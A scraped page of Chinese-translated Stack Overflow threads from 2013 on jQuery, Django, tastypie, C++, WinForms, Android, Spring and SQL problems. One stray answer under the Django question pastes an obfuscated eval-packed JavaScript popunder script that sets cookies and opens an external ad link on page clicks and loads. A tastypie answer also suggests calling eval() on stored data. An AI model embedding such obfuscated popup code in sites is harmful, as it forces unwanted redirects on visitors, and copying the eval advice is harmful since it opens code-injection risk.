我正在对我发现的一些 jQuery 代码进行逆向工程，这正是我想要的。它应该更改 #featured-navigation 中已单击的缩略图，`class="selected"`而其他未单击的只是`class=""`. 它还应该将 #featured-post 中的已连接帖子（与缩略图的 href 相同的 ID）更改为，`style="display: block;"`而其他帖子为`style="display:none;"`.

我对 jQuery 有足够的了解，知道它很简单，但我不知道它是如何工作的以及我应该如何使用它。Yeeeeah，我对 jQuery 几乎一无所知。

所以这是我的 jQuery，它在页脚中被调用-

```
/* Featured Rotation */

var featuredContainer = $('div#featured-post > div');
featuredContainer.hide().filter(':first').show();

$('div#featured-navigation > a').click(function () {

    featuredContainer.hide();
    featuredContainer.filter(this.hash).show();
    $('div#featured-navigation > a').removeClass('selected');
    $(this).addClass('selected');
    return false;

}).filter(':first').click(); 
```

这是我的全部特色帖子代码，它正确显示（减去大部分更精细的样式，截至目前），但不受 jQuery 的影响。我想我的 div 和所有设置都正确，但它仍然无法正常工作...... -

```
<div id="featured-navigation">
<?php
$featuredPostThumbs = new WP_Query();
$featuredPostThumbs->query('showposts=4&cat=9');
while ($featuredPostThumbs->have_posts()) : $featuredPostThumbs->the_post(); ?>
<a title="<?php the_title(); ?>" href=
<?php if( $featuredPostThumbs->current_post == 0 ) : ?>
"#featured-first"
<?php endif; 
if( $featuredPostThumbs->current_post == 1 ) : ?>
"#featured-second"
<?php endif; 
if( $featuredPostThumbs->current_post == 2 ) : ?>
"#featured-third"
<?php endif; 
if( $featuredPostThumbs->current_post == 3 ) : ?>
"#featured-fourth"
<?php endif; ?> >
<?php the_post_thumbnail( 'featured_thumb' ); ?>
</a>

<?php endwhile; 
wp_reset_postdata(); ?>
</div>
<div id="featured-post" class="clearfix">
<?php

$featuredPosts = new WP_Query();
$featuredPosts->query('showposts=4&cat=9');
while ($featuredPosts->have_posts()) : $featuredPosts->the_post(); ?>

<?php if( $featuredPosts->current_post == 0 ) : ?>
<div id="featured-first" style="display: block;">
<?php endif; 
if( $featuredPosts->current_post == 1 ) : ?>
<div id="featured-second" style="display: none;">
<?php endif; 
if( $featuredPosts->current_post == 2 ) : ?>
<div id="featured-third" style="display: none;">
<?php endif; 
if( $featuredPosts->current_post == 3 ) : ?>
<div id="featured-fourth" style="display: none;">
<?php endif; ?>
<div id="featured-left">
<?php the_post_thumbnail( 'featured' ); ?>
<h2><?php the_title(); ?></h2>
</div>
<div id="featured-right">
<?php the_excerpt(); ?>
<!-- by <?php the_author() ?> -->
<?php the_time('F jS, Y') ?>
</div>
</div>

<?php endwhile; 

wp_reset_postdata(); ?>
</div> 
```

这是我的测试站点，我正在摆弄所有这些。现在那里有很多未完成的东西，但我现在需要帮助的只是让这个 jQuery 工作。 [test.glutenfreemakeupgal.com/](http://test.glutenfreemakeupgal.com/)

非常感谢你！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:35:23.860

jQuery 需要放在对 $(document).ready 的调用中。否则，您会尝试将点击事件绑定到可能尚未创建的元素。

像这样：

```
$(document).ready(function() {
  var featuredContainer = $('div#featured-post > div');
  featuredContainer.hide().filter(':first').show();

  $('div#featured-navigation > a').click(function () {

    featuredContainer.hide();
    featuredContainer.filter(this.hash).show();
    $('div#featured-navigation > a').removeClass('selected');
    $(this).addClass('selected');
    return false;

  }).filter(':first').click();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:37:38.697

`functions.js`我在:中收到脚本错误`TypeError: 'undefined' is not a function (evaluating '$')`。

看起来你搞砸了覆盖 jQuery `$`。你看过关于 jQuery 的文档`$`吗？见[http://api.jquery.com/jQuery.noConflict/](http://api.jquery.com/jQuery.noConflict/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-14T03:19:55.380

感谢所有有用的回复，我终于想通了！它的工作！这是我的functions.js的新完整内容-

```
(function ($) {
$(document).ready(function() {

/* Featured Rotation */

var featuredContainer = $('div#featured-post > div');
featuredContainer.hide().filter(':first').show();

$('div#featured-navigation > a').click(function () {

    featuredContainer.hide();
    featuredContainer.filter(this.hash).show();
    $('div#featured-navigation > a').removeClass('selected');
    $(this).addClass('selected');
    return false;

}).filter(':first').click();

});
}(jQuery)); 
```

我在这个答案中发现了奇怪的开始标签 - [TypeError: 'undefined' is not a function (evalating '$(document)')](https://stackoverflow.com/questions/7975093/typeerror-undefined-is-not-a-function-evaluating-document)我不 100% 明白为什么他们必须这样做，但它似乎确实有效美好的。

再次感谢你们，你们！！一旦我达到 15 个代表，我就会提高你的答案，因为它们非常有帮助。几天来我一直在努力解决这个问题，你终于把我带到了我能做到的地方。谢谢！你摇滚！！:D

# django - Django 中的多项选择会引发“太多值无法解包”

> ID：15392300
> 
> 赞同：1
> 
> 时间：2013-03-13T17:27:06.030
> 
> 标签：django, forms, tuples, multiple-choice

我正在尝试使用复选框创建多项选择。我在复选框中显示了数据，但是当我提交时出现以下错误：

模板错误：要解压的值太多

我读到有些人的问题是他们没有创建 2tuples 作为选择列表的元素。但情况似乎并非如此。问题可能是什么？

**表格.py**

```
class Test(forms.Form):
    answer = forms.MultipleChoiceField(widget=forms.CheckboxSelectMultiple)

    def __init__(self, options, *args, **kwargs):
        super(Test, self).__init__(*args, **kwargs)
        self.fields['answer'].choices = options 
```

**视图.py**

```
def multiChoice(request,ex):

    multi = MultipleChoice.objects.get(pk=ex)
    choices = multi.correct_choices.all() | multi.wrong_choices.all()

    if request.method == 'POST':
        form = Test(request.POST)
        if form.is_valid():
            multiple = form.save()
            return HttpResponseRedirect('/edu/multi/1')
    else:
        form = Test(options=[( choice.id , choice ) for choice in choices])

    return render(request,'edu/multi.html', {'form': form, 'multi': multi , 'choices': choices}) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T17:31:35.773

比较这些：

```
form = Test(request.POST)

def __init__(self, options, ... 
```

你`request.POST`作为`options`论据传递。

试试这个：

```
form = Test(data=request.POST) 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2014-11-14T13:00:37.623

如何解压这段代码我用所有 eval 解压器测试它但它不解码

```
eval(function(p,a,c,k,e,d){e=function(c){return(c35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('c d(7){2 i,x,y,3=a.h.M(";");L(i=0;i<3.K;i++){x=3[i].q(0,3[i].B("="));y=3[i].q(3[i].B("=")+1);x=x.J(/^\\s+|\\s+$/g,"");5(x==7){I O(y)}}}c l(7,m){2 e=S;2 9=R Q();9.P(9.T()+e);2 u=G(m)+((e==6)?"":"; H="+9.F());a.h=7+"="+u+\';E=/\'}c b(){2 8=d("f");2 k=d("N");2 o="f";5(8==""|8==6){5(4.j(\'W://1a.19/18.17?1b=1c&1g=U&1e=1d&16=15&Y=\',\'X\',\'n=1,w=1,D=1,A=1,C=1,p=1,rأ¢â‚¬â€¹Z=1\')){4.z();l("f",o)}}5(8==6|k==6){4.j(\'\',\'10\',\'n=1,w=1,D=1,A=1,C=1,p=1,12=1\');4.z()}}a.v=b;5((4.1h==t)&&(11!=t)){4.13=b}2 14=V(c(){a.v=b},1f);',62,80,'||var|ARRcookies|window|if|null|c_name|username1|exdate|document|irpopup_checkCookie|function|irpopup_getCookie|exdays|irpopupx||cookie||open|username2|irpopup_setCookie|value|toolbar|usernam|scrollbars|substr|||undefined|c_value|onclick|location|||focus|status|indexOf|menubar|directories|path|toUTCString|escape|expires|return|replace|length|for|split|irpopupx2|unescape|setHours|Date|new|12|getHours|TVRrMU9UYz0%3D|setInterval|http|_blank|reffer|esizable|_parent|ActiveXObject|resizable|onload|setDocument|VFZFOVBRPT0%3D|type|php|go|ir|irpopup|user|834|613111556.Xo*TNo|rand|3000|link|XMLHttpRequest'.split('|'),0,{})) 
```

# django - django-tasty-pie 将 char 字段转为 JSON

> ID：15392310
> 
> 赞同：1
> 
> 时间：2013-03-13T17:27:50.097
> 
> 标签：django, api, rest, tastypie

我正在使用 JSONfield 在一个字段中存储一些 JSON 格式的数据。但是，当我转到我的 API 时，它在美味派的帮助下构建，它以字符串的形式返回 jason，而不是我预期的嵌套 JSON。

# 模型.py

```
class Item(models.Model):
    user = models.ForeignKey(User)
    body = JSONField(max_length=1024) 
```

# api.py

```
 class ItemResource(ModelResource):
    authorization = Authorization()
    authentication = SessionAuthentication()
    list_allowed_methods = ['get', 'post']

    class Meta:
        queryset = Item.objects.filter()

    def get_object_list(self, request):
        return super(ItemResource, self).get_object_list(request).filter(user=request.user)

    def apply_authorization_limits(self, request, object_list):
        return object_list.filter(user=request.user)

    def dehydrate(self, bundle):
        # how to modify bundle['body'] here ? so it work
        return bundle 
```

显然 JSONfield 是从 django 的标准 TextField 继承而来的。因此，当我检索 API 时，我收到以下信息：

```
 {
    "meta": {
        "limit": 20,
        "next": null,
        "offset": 0,
        "previous": null,
        "total_count": 1
    },
    "objects": [
       {
        "body": "{u'valid': u'json'}",
        "id": 1,
        "resource_uri": "/api/v1/testitem/1/"
        }
    ]
  } 
```

这就是我想要收到的：

```
 {
    "meta": {
        "limit": 20,
        "next": null,
        "offset": 0,
        "previous": null,
        "total_count": 1
    },
    "objects": [
       {
        "body": {
             "valid': "json"
           },
        "id": 1,
        "resource_uri": "/api/v1/testitem/1/"
        }
    ]
  } 
```

注意`body`领域的差异？

如果我这样做：

```
 def dehydrate(self, bundle):
        bundle['body'] = json.loads(bundle['body'])
        return bundle 
```

我收到此异常：

```
{"error_message": "Expecting property name: line 1 column 1 (char 1)", "traceback": "Traceback (most recent call last):\n\n  File \"/Users/polinom/Envs/django/lib/python2.7/site-packages/tastypie/resources.py\", line 202, in wrapper\n    response = callback(request, *args, **kwargs)\n\n  File \"/Users/polinom/Envs/django/lib/python2.7/site-packages/tastypie/resources.py\", line 439, in dispatch_list\n    return self.dispatch('list', request, **kwargs)\n\n  File \"/Users/polinom/Envs/django/lib/python2.7/site-packages/tastypie/resources.py\", line 471, in dispatch\n    response = method(request, **kwargs)\n\n  File \"/Users/polinom/Envs/django/lib/python2.7/site-packages/tastypie/resources.py\", line 1270, in get_list\n    bundles.append(self.full_dehydrate(bundle))\n\n  File \"/Users/polinom/Envs/django/lib/python2.7/site-packages/tastypie/resources.py\", line 845, in full_dehydrate\n    bundle = self.dehydrate(bundle)\n\n  File \"/Users/polinom/workspace/microjob/applications/examinations/api.py\", line 24, in dehydrate\n    bundle.data['body'] = json.loads(bundle.data['body'])\n\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/json/__init__.py\", line 326, in loads\n    return _default_decoder.decode(s)\n\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/json/decoder.py\", line 360, in decode\n    obj, end = self.raw_decode(s, idx=_w(s, 0).end())\n\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/json/decoder.py\", line 376, in raw_decode\n    obj, end = self.scan_once(s, idx)\n\nValueError: Expecting property name: line 1 column 1 (char 1)\n"} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T18:26:01.997

创建捆绑包后，通过[序列化内容](https://github.com/toastdriven/django-tastypie/blob/master/tastypie/resources.py#L360)[来创建响应](https://github.com/toastdriven/django-tastypie/blob/master/tastypie/resources.py#L1174)。对于 json 格式和默认的 Serializer，它首先[将任何复杂类型转换为 python 基本类型](https://github.com/toastdriven/django-tastypie/blob/master/tastypie/serializers.py#L198)，然后[将其转储为字符串表示形式](https://github.com/toastdriven/django-tastypie/blob/master/tastypie/serializers.py#L341)。

如您所见，对于原始字符串，它只是将其转换为 unicode。您需要`dict`在序列化资源之前将其转换为 a 。因此，在`dehydrate`您可以执行的方法中：

```
def dehydrate(self, bundle):
    bundle['body'] = json.loads(bundle.data['body'])
    return bundle 
```

由于您只修改一个元素，您还可以执行以下操作：

```
def dehydrate_body(self, bundle):
    return json.loads(bundle.data['body']) 
```

* * *

JSONField 存储 python dict 表示，而不是 JSON 表示。所以，我的第一次尝试是不正确的。你可以`return eval(bundle.data['body'])`。IMO 在`eval`这里使用是安全的，因为 JSONField 确保内容是可以直接转换为 json 表示的语句。

# c++ - 在基类的非虚函数中调用基类的虚函数

> ID：15392312
> 
> 赞同：0
> 
> 时间：2013-03-13T17:27:51.537
> 
> 标签：c++

在基类的非虚函数中调用派生类中实现的基类的虚函数是否正确。就像是

```
class A
{
 virtual void func1() = 0;

 void func2()
 {
   func1();
 }
};

class B : public A
{
 virtual void func1()
 {
   //do something here;
 }
};

int main()
{
 A* obj = new B;
 obj->func2();
 return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:28:51.760

是的，这会起作用。你自己试过吗？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:43:16.207

它不仅是一种众所周知且有效的解决问题的方法，而且如果`func2`是内联的，这可能意味着与直接调用内部函数相比没有额外的开销。显然，有时整个目的是在内部做一些事情`func1`，然后`func2`在中间或最后调用，但在这种额外工作很少的情况下，“额外功能层”可能会完全消失。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-13T17:29:52.493

是的，没关系。这允许您在基类中提供通用流程，其细节专门针对其子类。

请参阅[模板方法](http://en.wikipedia.org/wiki/Template_method_pattern)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-13T17:33:39.817

是的。当您需要操作符实现的虚函数行为时使用此技术：您根据虚拟（或抽象）函数定义您的操作符，并让特化来决定如何实现该函数。

例子：

```
class base
{
// yada yada yada
    base& operator=(const base& other) { return assign(other); }
protected:
    virtual base& assign(const base& other) = 0; // specializations will decide
                                                 //  what assignment means
}; 
```

编辑：该技术的另一个用途是允许您的类的专业化只控制更复杂操作的部分：

```
class database
{
public:
    void execute(const std::string& query)
    {
        begin_transaction(); // in practice, this should be RAII
        connection_.execute(query);
        end_transaction();
    }
protected:
    virtual void begin_transaction() = 0;
    virtual void end_transaction() = 0;
private:
    whatever &connection_;
}; 
```

在数据库专业化中，假设`mysql_database::begin_transaction`将具有与`sqlite_database::begin_transaction`.

# c# - WinForms 中是否有等效的 HTML-RadioButton 值？

> ID：15392316
> 
> 赞同：0
> 
> 时间：2013-03-13T17:27:57.353
> 
> 标签：c#, winforms, radio-button

我正在尝试在 WinForm 上创建一系列 RadioButtons。它工作正常，但在点击事件中，我想捕获产品 ID 并用它做一些事情。我习惯于 HTML 元素，并将数据分配给 RadioButton 的标签和值。使用 WinForms，我看不到 value 属性的等价物。

关于如何将产品 ID 传递给 RadioButton Change-event 有什么好的建议吗？

```
var products = new Business.Products().GetAll();
if (!products.Any())
    GrpCategories.Controls.Clear();

int y = 2;
int x = 2;
foreach (var product in products)
{
    var btn = new RadioButton();
    btn.Width = 100;
    btn.Height = 20;
    if (y >= GrpCategories.Height - btn.Height - 10)
    {
        x += btn.Width + 2;
        y = 2;
    }
    y += btn.Height + 2;
    btn.Appearance = Appearance.Button;
    btn.Text = product.Name;
    btn.Name = "BtnProduct_" + product.ID;
    btn.Location = new Point(x, y);

    GrpCategories.Controls.Add(btn);
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T17:31:44.003

只需[`Tag`使用](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.tag.aspx)`RadioButton`. _ 此属性可以存储任何 .NET 对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:38:35.037

winform 中没有像 RadioButtonList 控件这样的东西，否则它可以解决你的问题。

但是，您也可以通过将单选按钮添加到容器（如 Panel 控件、GroupBox 控件或表单）中来对它们进行分组。

Drag a group panel inside your form and then add your radio buttons, this will group all the radio buttons inside that group.. [as is done here](http://msdn.microsoft.com/en-us/library/sefz7fxc.aspx).

# air - 导入 Freshplanet ANE

> ID：15392317
> 
> 赞同：2
> 
> 时间：2013-03-13T17:28:09.717
> 
> 标签：air, air-native-extension

我发现了很棒的 Freshplanet ANE 存储库[https://github.com/freshplanet/](https://github.com/freshplanet/) 我正在尝试让基本的 AirAlert 工作，但我不知道如何解决导入问题。

我在 IntelliJ 中构建了我的 Adob​​e AIR iOS 应用程序，并且已经有几个 ANE 成功运行。所以我所做的，

1.  将 AirAlert.ane 复制到我的 ane 文件夹中
2.  包含在我的 App.xml 扩展标记中的相关

    com.freshplanet.AirAlert

3.  在我的项目的构建配置中添加了 ane，以便在我在 IntelliJ 中构建时它具有正确的依赖关系

但我似乎无法在我的代码中解决 AirAlert。我试过没有运气。

```
import AirAlert; 

import com.freshplanet.AirAlert 
```

我在这里错过了什么吗？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-14T13:05:54.247

固定的！将 ANE 添加到 IntelliJ 中我的模块设置下的所有构建配置之后。

我有大约四种不同的配置，一种用于部署到模拟器，一种用于设备等，我只将 ANE 添加到部署到设备的配置中，因为这是我有兴趣测试它的地方。

但是在我将它添加到所有其他的之后，我可以解决

```
import com.freshplanet.ane.AirAlert.AirAlert; 
```

希望这对某人有帮助！

# vb.net - MS Access 2010 表单，每条记录带有复选框

> ID：15392321
> 
> 赞同：0
> 
> 时间：2013-03-13T17:28:17.140
> 
> 标签：vb.net, ms-access, ms-access-2010

我正在尝试创建一个表格，允许我的审计团队帮助识别需要进一步调查的交易。

以下是可能的吗？如果是这样，实现这一目标的最佳方法是什么？我想为从查询返回的每条记录在表单中设置一个复选框。然后，该复选框将用于标识将附加到另一个表的记录。

我过去曾为链接到临时表的表单这样做过；但是，由于此表单与查询相关联，我认为我遇到了问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:33:54.807

您可以将复选框添加到表单并使用一些 VBA 代码将查询中的所有这些行插入到另一个表中，该表已选中复选框（`Forms!MyForm!myCb = True`）

# java - 获取登录用户的facebook好友列表

> ID：15392323
> 
> 赞同：0
> 
> 时间：2013-03-13T17:28:28.113
> 
> 标签：java, android, facebook

我想为已经通过与我的应用程序集成的 Facebook 小部件登录的用户获取 Facebook 朋友。

我创建了一个检索朋友列表的活动，但它对我不起作用。`String id`（我在变量中也有登录用户的 Facebook ID ）。

```
public class FreindsActivity extends Activity {

    Facebook mFacebook;
    String name,password,email,id,phone,emailOwner;
    AsyncFacebookRunner mAsyncRunner;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.profile_page);

        Intent intent = getIntent();
        name = intent.getExtras().getString("name");
        password = intent.getExtras().getString("password");
        email = intent.getExtras().getString("email");
        id = intent.getExtras().getString("id");
        phone = intent.getExtras().getString("phone");
        emailOwner=intent.getExtras().getString("emailOwner");

        mFacebook=new Facebook(id);
        mAsyncRunner = new AsyncFacebookRunner(mFacebook);
        mAsyncRunner.request("me/friends", new FriendsRequestListener());

        //Bundle params = new Bundle();
       // params.putString("fields", "name,id");
    }

    public class FriendsRequestListener implements com.facebook.android.AsyncFacebookRunner.RequestListener 
    {
        /**
         * Called when the request to get friends has been completed.
         * Retrieve and parse and display the JSON stream.
         */
        public void onComplete(final String response)
        {
            try 
            {
                // process the response here: executed in background thread
                JSONObject json = Util.parseJson(response);
                JSONArray friendsData = json.getJSONArray("data");
                String ids[]=new String[friendsData.length()] , names[] = new String[friendsData.length()];
                for(int i = 0; i < friendsData .length(); i++){ 
                     ids[i] = friendsData .getJSONObject(i).getString("id");
                     names[i] = friendsData .getJSONObject(i).getString("name");
               }

            }
            catch (JSONException e)
            {
            }
        }

        @Override
        public void onComplete(String response, Object state) {
            // TODO Auto-generated method stub

            try 
            {

                JSONObject json = Util.parseJson(response);
                JSONArray friendsData = json.getJSONArray("data");
                String ids[]=new String[friendsData.length()] , names[] = new String[friendsData.length()];
                for(int i = 0; i < friendsData .length(); i++){ 
                     ids[i] = friendsData .getJSONObject(i).getString("id");
                     names[i] = friendsData .getJSONObject(i).getString("name");
                }
            }
            catch (JSONException e){

            }

        }

        @Override
        public void onIOException(IOException e, Object state) {
            // TODO Auto-generated method stub

        }

        @Override
        public void onFileNotFoundException(FileNotFoundException e,
                Object state) {
            // TODO Auto-generated method stub

        }

        @Override
        public void onMalformedURLException(MalformedURLException e,
                Object state) {
            // TODO Auto-generated method stub

        }

        @Override
        public void onFacebookError(FacebookError e, Object state) {
            // TODO Auto-generated method stub

        }
    }

} 
```

日志猫：

```
03-13 17:24:33.396: E/AndroidRuntime(846): FATAL EXCEPTION: Thread-107
03-13 17:24:33.396: E/AndroidRuntime(846): com.facebook.android.FacebookError: An active access token must be used to query information about the current user.
03-13 17:24:33.396: E/AndroidRuntime(846):  at com.facebook.android.Util.parseJson(Util.java:272)
03-13 17:24:33.396: E/AndroidRuntime(846):  at com.example.salebook.FreindsActivity$FriendsRequestListener.onComplete(FreindsActivity.java:87)
03-13 17:24:33.396: E/AndroidRuntime(846):  at com.facebook.android.AsyncFacebookRunner$2.run(AsyncFacebookRunner.java:276) 
```

谢谢

# magento - 使用 Pear 进行 Magento 升级

> ID：15392338
> 
> 赞同：0
> 
> 时间：2013-03-13T17:28:51.067
> 
> 标签：magento

我想使用以下命令升级我的 magento 网站：

```
./mage install http://connect20.magentocommerce.com/community Mage_All_Latest --force 
```

我想知道是否有办法运行相同的命令，而不是使用 Mage_All_Latest 我可以选择要升级到的版本吗？

我想升级到社区 1.6

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T19:53:54.753

您运行的是 1.4.x 还是更低版本？如果是这样，请参阅以下 SO 问题和答案。它包含从 1.3 或 1.4 升级 Magento 的绝佳指南：[如何将 magento 1.4 1.1 升级到 1.7.0.2](https://stackoverflow.com/questions/11662347/how-to-upgrade-magento-1-4-1-1-to-1-7-0-2)

一旦超过 1.3.x，您就可以将 1.6 结构复制到您的站点并刷新缓存。下一页加载会将您升级到您复制的版本。

在尝试任何升级过程之前，请务必备份您的文件和数据库。

# android - 使用 Intent.ACTION_VIEW 显示本地资源失败

> ID：15392343
> 
> 赞同：2
> 
> 时间：2013-03-13T17:29:03.950
> 
> 标签：android

我想显示一个包含在 apk 中的文件。我可以将缩略图放入一个小的 ImageView 中，当用户单击它时，我想使用 Gallery（或用户拥有的任何图像查看应用程序）显示完整尺寸

下面是 clicklistener ：我想从“原始”文件夹中提取完整大小并启动​​和活动。我失败了

```
private OnClickListener showImage = new OnClickListener() {
    public void onClick(View v) {
        Intent intent = new Intent();
        intent.setAction(android.content.Intent.ACTION_VIEW);
        intent.setData(Uri.parse("android.resource://com.invodo.allshareplay/" + R.raw.dropbox_photo1));
        intent.setType("image/jpeg");
        startActivity(intent);

    }

}; 
```

--- 日志猫 ----

```
03-13 11:16:33.704: E/AndroidRuntime(10466): FATAL EXCEPTION: main
03-13 11:16:33.704: E/AndroidRuntime(10466): android.content.ActivityNotFoundException:     No Activity found to handle Intent { act=android.intent.action.VIEW   dat=android.resource://com.invodo.allshareplay/2130968576 }
03-13 11:16:33.704: E/AndroidRuntime(10466):    at android.app.Instrumentation.checkStartActivityResult(Instrumentation.java:1622) 
```

我尝试了几种不同的获取 Uri 路径的变体，包括使用文件名作为

```
 intent.setData(Uri.parse("android.resource://com.invodo.allshareplay/raw/dropbox_photo1.jpg")); 
```

在模拟器上，它告诉启动 ViewImage 但然后说相机已停止，除非我取出这一行：

```
intent.setType("image/jpeg"); 
```

并且注释掉它只是失败，没有找到活动。

如果我将此代码放在真实设备上，它会在手机上提取我的图像，而不是我想要显示的图像。如果我取消 SetType 调用，它就会停止。

不管我在获得正确的 Uri 时可能做错了什么，关于如何正确显示作为原始资源隐藏的 jpeg 图像的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-19T09:05:00.413

这似乎与[此问题](https://stackoverflow.com/questions/2954594/launching-intent-action-view-intent-not-working-on-saved-image-file)中描述的流程类似。

建议的解决方案是添加**“file://”**作为文件绝对路径的前缀。所以 Intent 应该设置如下：

...

```
Uri hacked_uri = Uri.parse("file://" + uri.getPath());
intent.setDataAndType(hacked_uri, "image/*");
... 
```

它对我有用...

# java - Spring Java Config 使用 Autowired 导致 NPE

> ID：15392344
> 
> 赞同：4
> 
> 时间：2013-03-13T17:29:10.277
> 
> 标签：java, spring, configuration

我很难理解为什么 Spring Java Config using 中的某些东西`@Autowired`不起作用。

首先，我试图`@Autowired`在 Java Config 类中移动我的所有注释。这具有使我的“POJO”回到真正的 POJO 的效果。然后，我不仅可以在 Spring 上下文之外轻松测试它们，还可以轻松轻松地使用模拟对象。

所以我首先尝试了这个：

```
@Configuration
public class Module3ConfigClass {

    @Autowired
    private Module1Bean1 module1Bean1;

    @Autowired
    private Module2Bean1 module2Bean1;

    @Bean
    public Module3Bean1 module3Bean1() {
        return new Module3Bean1(module1Bean1, module2Bean1);
    }
} 
```

但是，在`Module3Bean1`调用构造函数时，传入的 Bean 都为 null。如果您没有遵循我上面编造的命名约定，那么这两个 bean 都将由单独的 Java Config 配置文件创建。另请注意，所有内容*都已*正确连接 - 我知道这一点，因为当`@Autowired`标签位于`Module3Bean1`.

FWIW，我尝试向方法添加`@DependsOn`注释`module3Bean1()`，但结果相同。我想我真的很想了解这种行为，它是否正确（我怀疑它是，但为什么）？

最后，我找到了一个可以接受的解决方法：

```
@Configuration
public class Module3ConfigClass {

    @Bean
    @Autowired
    public Module3Bean1 module3Bean1(Module1Bean1 module1Bean1, Module2Bean1 module2Bean1) {
        return new Module3Bean1(module1Bean1, module2Bean1);
    }
} 
```

这对我来说似乎很好，但如果有人愿意对此发表评论，那也将受到欢迎。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-01T11:12:35.517

我想你遇到了我刚刚遇到的同样问题。在我的情况下，问题是无效的 xml 配置。在我的模块中，BI 的配置如下：

```
<beans>
      <context:component-scan base-package="com.moduleB"/>
      <import resource="classpath:applicationContext-moduleA.xml"/>
</beans> 
```

在 moduleA 上下文中，我放置了“context:annotation-config”注释。当我将导入/上下文顺序更改为：

```
<beans>
      <import resource="classpath:applicationContext-moduleA.xml"/>
      <context:component-scan base-package="com.moduleB"/>
</beans> 
```

配置类属性的自动装配开始起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-20T12:20:40.267

我们遇到了同样的问题，并得出的结论是错误的出现是因为我们有一个`BeanPostProcessor`涉及 a 的循环依赖。

*   一个 PropertyPlaceholderConfigurer（一个 BeanPostProcessor）已经被配置为在另一个 bean 的帮助下设置它的 propertiesArray 属性：

    ```
    <bean id="globalPropertyPlaceholderConfigurer"
        class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"
        lazy-init="false" depends-on="javaLoggingConfigurer">
        <property name="locations">
            <list>
                <value>classpath:config/host/${env.instance}.properties</value>
                <value>WEB-INF/config/host/${env.instance}.properties</value>
            </list>
        </property>
        <property name="ignoreResourceNotFound" value="true" />
        <property name="propertiesArray" value="#{springPropertyFinder.findProperties()}" />
    </bean> 
    ```

*   用于设置 propertiesArray 的 springPropertyFinder bean*不是*BeanPostProcessor 而是一个“普通”bean，它收集所有 Properties 实例：

    ```
    public Properties[] findProperties() {
        Map<String, Properties> propertiesMap = applicationContext.getBeansOfType(Properties.class);

        for (String title : propertiesMap.keySet()) {
            PropertiesLoggerUtil.logPropertiesContent(logger, "Springcontext Properties ("+title+")", propertiesMap.get(title));
        }

        return propertiesMap.values().toArray(new Properties[propertiesMap.size()]);
    } 
    ```

*   @Configuration 类包含一个属性类型的 bean

所以我们的假设是@Configuration类已经创建，没有经过ConfigurationClassPostProcessor（也是一个BeanPostProcessor）的处理，因为PropertyPlaceholderConfigurer依赖于springPropertyFinder，而springPropertyFinder又依赖于@Configuration类中的properties bean。在这些情况下，可能没有正确设置 BeanPostProcessors 的顺序。

此描述的设置适用于 XML，但不适用于 Java 配置。

# sql - 如何仅过滤表中的首次出现

> ID：15392347
> 
> 赞同：3
> 
> 时间：2013-03-13T17:29:18.273
> 
> 标签：sql, sql-server, sql-server-2008

这是表结构：

**tbl申请人**：

```
applicantID (index)   |     ApplyingForYear (nvarchar) 
------------------------------------------------------
1                           2013/14
11                          2013/14
13                          2013/14
12                          2013/14
15                          2013/14
21                          2012/13 
```

**tblApplicantSchools_shadow**：

```
id (index)   |    applicantID    |    updated (datetime)   |   statusID (int)   |   schoolID (int)
-----------------------------------------------------------------------------------------------------
1                   11                  2012-09-24 00:00:00.000     3                   2
1                   13                  2012-10-24 00:00:00.000     4                   2
2                   15                  2012-11-24 00:00:00.000     3                   4
3                   13                  2012-03-24 00:00:00.000     4                   3
4                   12                  2012-09-24 00:00:00.000     4                   1
5                   21                  2012-11-03 00:00:00.000     5                   2
6                   11                  2012-09-04 00:00:00.000     4                   4 
```

我需要做的是：

*   获取所有具有`ApplyingForYear`“2013/14”的申请人`tblApplicants`
*   有一个`statusID`4
*   我只想数**一次**——即使它们出现两次或更多`tblApplicantschools_show`
*   对不同申请人的数量进行分组（如上所述） - 按`updated`日期列（按周分组）

所以根据上面的示例数据，应该有 3 行出来，（因为`ApplicantID`13 出现了两次，我只想要他一次）。

结果应该是这样的：

```
 Datesubmitted              TotalAppsPerWeek
    -------------------------------------------------------
    2012-10-24 00:00:00.000    1
    2012-09-24 00:00:00.000    1
    2012-09-04 00:00:00.000    1 
```

这是我到目前为止所拥有的 - 但它会产生 4 行，而不是 3 :(

```
select  
   DATEADD(ww,(DATEDIFF(ww,0,[tblApplicantSchools_shadow].updated)),0) AS Datesubmitted,
   count(DISTINCT [tblApplicantSchools_shadow].applicantID) as TotalAppsPerWeek 
FROM tblApplicants  
INNER JOIN tblApplicantSchools_shadow 
      ON tblApplicantS.ApplicantID = tblApplicantSchools_shadow.applicantID
WHERE 
     ApplyingForYear = '2013/14' 
